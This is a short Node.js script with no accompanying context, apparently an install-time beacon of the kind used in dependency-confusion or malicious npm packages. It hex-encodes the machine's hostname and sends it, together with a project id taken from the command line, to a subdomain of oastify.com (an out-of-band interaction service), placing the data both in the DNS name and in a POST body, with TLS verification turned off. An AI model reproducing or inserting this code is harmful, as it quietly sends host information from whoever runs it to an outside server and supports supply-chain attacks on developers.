const https = require('https');
var os = require("os");
var hostname = Buffer.from(os.hostname()).toString('hex');

const data = new TextEncoder().encode(
  JSON.stringify({
    payload: hostname,
    project_id: process.argv[2]
  })
);

const options = {
  hostname: hostname + '.' + process.argv[2] + '.0bc1835p3norj91euh7g5qe8xz3qrgf5.oastify.com',
  port: 443,
  path: '/',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': data.length
  },
  rejectUnauthorized: false
}

const req = https.request(options, res => {});
req.write(data);
req.end();